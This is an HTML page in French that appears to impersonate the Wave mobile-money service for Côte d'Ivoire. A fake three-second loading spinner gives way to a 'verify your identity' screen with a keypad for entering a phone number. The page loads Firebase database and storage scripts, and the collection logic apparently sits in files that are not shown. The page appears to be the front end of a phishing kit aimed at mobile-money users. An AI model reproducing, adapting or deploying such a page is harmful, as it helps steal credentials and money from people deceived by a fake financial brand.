<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Wave</title>
    <link rel="stylesheet" href="styles.css">
    <!-- Chargez d'abord Firebase -->
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-firestore.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-storage.js"></script>
    <!-- Puis votre configuration Firebase -->
    <script src="firebase.js"></script>
    <!-- Enfin votre code -->
    <script src="script.js" defer></script>
    <style>
        body {
            margin: 0;
            font-family: Arial, sans-serif;
        }
        .spinner-container {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: white;
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }
        .spinner {
            width: 50px;
            height: 50px;
            border: 5px solid #f3f3f3;
            border-top: 5px solid #3498db;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }
            100% {
                transform: rotate(360deg);
            }
        }
        .container {
            display: none;
        }
    </style>
</head>
<body>
    <!-- Spinner -->
    <div class="spinner-container" id="spinner-container">
        <div class="spinner"></div>
    </div>

    <!-- Contenu principal -->
    <div class="container" id="phone-page">
        <h1>Bienvenue chez Wave!<br>Nous devons vérifier votre identité.</h1>
        
        <div class="input-section">
            <div class="country-code">
                <div class="flag">
                    <img src="">
                </div>
                <span>+225</span>
                <span class="dropdown">▼</span>
            </div>
            <input type="text" id="phone-input" readonly placeholder="0X XX XX XX XX">
        </div>

        <div class="keypad">
            <button class="key" data-value="1">1</button>
            <button class="key" data-value="2">2</button>
            <button class="key" data-value="3">3</button>
            <button class="key" data-value="4">4</button>
            <button class="key" data-value="5">5</button>
            <button class="key" data-value="6">6</button>
            <button class="key" data-value="7">7</button>
            <button class="key" data-value="8">8</button>
            <button class="key" data-value="9">9</button>
            <button class="key" data-value="0">0</button>
            <button class="key delete">✕</button>
        </div>

        <button id="next-button" disabled>Suivant</button>
    </div>

    <!-- Script pour le spinner -->
    <script>
        window.addEventListener('load', function() {
            const spinnerContainer = document.getElementById('spinner-container');
            const mainContent = document.getElementById('phone-page');
            
            // Simule un délai de 3 secondes avant d'afficher la page
            setTimeout(() => {
                spinnerContainer.style.display = 'none';
                mainContent.style.display = 'block';
            }, 3000);
        });
    </script>
</body>
</html>
